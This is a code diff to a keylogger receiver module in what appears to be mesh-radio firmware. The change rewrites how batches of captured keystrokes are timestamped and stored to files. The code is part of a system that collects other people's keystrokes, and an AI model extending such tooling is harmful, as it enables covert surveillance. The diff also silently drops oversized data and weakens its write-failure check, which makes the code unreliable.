@@ -301,20 +301,63 @@ bool KeylogReceiverModule::storeKeystrokeBatch(NodeNum from, uint32_t batchId,
         return false;
     }
 
-    // Write batch header with timestamp
-    uint32_t timestamp = getValidTime(RTCQualityFromNet);
+    // Write batch header with timestamp (seconds since midnight for storage efficiency)
+    // v7.12: Store only time portion since date is in filename
+    uint32_t fullTimestamp = getValidTime(RTCQualityFromNet);
+    uint32_t secondsSinceMidnight = fullTimestamp % 86400;  // 86400 = seconds in a day
     int headerLen = file.printf("\n--- Batch 0x%08lX at %lu ---\n",
-                                 (unsigned long)batchId, (unsigned long)timestamp);
+                                 (unsigned long)batchId, (unsigned long)secondsSinceMidnight);
     if (headerLen <= 0) {
         LOG_ERROR("[KeylogReceiver] Failed to write batch header");
         file.close();
         return false;
     }
 
-    // Write keystroke data
+    // Write keystroke data with optimized timestamps (v7.12)
+    // Convert epoch timestamps to seconds-since-midnight for storage efficiency
+    // Format: [epoch:10][data:N][epoch:10]
     // NASA Rule 2: Fixed upper bound on write
     size_t written = 0;
-    if (len > 0) {
+    if (len >= 20) {  // Minimum: 10 (start epoch) + 10 (end epoch)
+        // Parse start epoch (first 10 chars)
+        char startEpochStr[11];
+        memcpy(startEpochStr, data, 10);
+        startEpochStr[10] = '\0';
+        uint32_t startEpoch = strtoul(startEpochStr, nullptr, 10);
+
+        // Parse end epoch (last 10 chars)
+        char endEpochStr[11];
+        memcpy(endEpochStr, data + len - 10, 10);
+        endEpochStr[10] = '\0';
+        uint32_t endEpoch = strtoul(endEpochStr, nullptr, 10);
+
+        // Convert to seconds since midnight
+        uint32_t startTime = startEpoch % 86400;
+        uint32_t endTime = endEpoch % 86400;
+
+        // Write optimized format: [time:5][data][time:5]
+        char optimizedBuf[512];  // NASA Rule 3: Fixed size
+        int pos = 0;
+
+        // Write start time (max 5 digits: 86400)
+        pos += snprintf(optimizedBuf + pos, sizeof(optimizedBuf) - pos, "%lu", (unsigned long)startTime);
+
+        // Copy middle data (excluding first and last 10 chars)
+        if (len > 20) {
+            size_t middleLen = len - 20;
+            if (pos + middleLen < sizeof(optimizedBuf)) {
+                memcpy(optimizedBuf + pos, data + 10, middleLen);
+                pos += middleLen;
+            }
+        }
+
+        // Write end time
+        pos += snprintf(optimizedBuf + pos, sizeof(optimizedBuf) - pos, "%lu", (unsigned long)endTime);
+
+        // Write optimized data to file
+        written = file.write((uint8_t *)optimizedBuf, pos);
+    } else if (len > 0) {
+        // Fallback: write as-is if format doesn't match expected
         written = file.write(data, len);
     }
 
@@ -325,12 +368,13 @@ bool KeylogReceiverModule::storeKeystrokeBatch(NodeNum from, uint32_t batchId,
     file.flush();
     file.close();
 
-    if (written != len) {
-        LOG_ERROR("[KeylogReceiver] Partial write: %u of %u bytes", written, len);
+    // v7.12: written may be less than len due to timestamp optimization (10+10 → 5+5)
+    if (written == 0 && len > 0) {
+        LOG_ERROR("[KeylogReceiver] Write failed: 0 of %u bytes", len);
         return false;
     }
 
-    LOG_DEBUG("[KeylogReceiver] Stored %u bytes to %s", len, pathBuf);
+    LOG_DEBUG("[KeylogReceiver] Stored %u bytes to %s (optimized from %u)", written, pathBuf, len);
     return true;
 }
 
